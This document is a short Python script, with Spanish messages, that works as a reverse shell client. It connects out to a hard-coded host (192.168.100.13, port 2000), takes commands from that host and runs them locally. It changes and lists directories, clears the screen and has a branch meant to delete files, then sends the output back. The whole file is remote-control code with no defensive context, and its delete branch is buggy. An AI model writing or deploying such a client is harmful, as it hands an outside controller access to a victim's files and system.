import socket
import os
import subprocess

direccion = ('192.168.100.13', 2000)
 
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cliente:
    cliente.connect(direccion)
    print(f'Connect to {direccion}')
    while True:
        cmd = cliente.recv(1024).decode()
        
        if len(cmd) <= 1:
            resultado = ''

        if cmd.find('cd ') == 0:
            cmd = cmd[3:]
            try:
                os.chdir(cmd)
                resultado = f'Se movio a {cmd}'
            except:
                resultado = f'No se encontro {cmd}'
        elif cmd in ['pwd','chdir']:
            resultado = os.getcwd()
        elif cmd in ['ls','dir']:
            if os.name in ['ce','nt','dos']:
               resultado = subprocess.check_output('powershell ls', shell=True).decode()
            else:
                resultado = os.popen('ls').read()
        elif cmd in ['rm','del']:
            cmd = cmd[cmd.find(' ')+1:]
            os.remove(cmd)
            resultado = f'Se elimino {cmd}'
        elif cmd in ['clear','cls']:
            if os.name in ['ce','nt','dos']:
                resultado = os.popen('cls').read()
            else:
                resultado = os.popen('clear').read()
        elif cmd == 'exit':
            break
        else:
            resultado = f'No se reconoce el comnado {cmd}'

        cliente.send(resultado.encode())
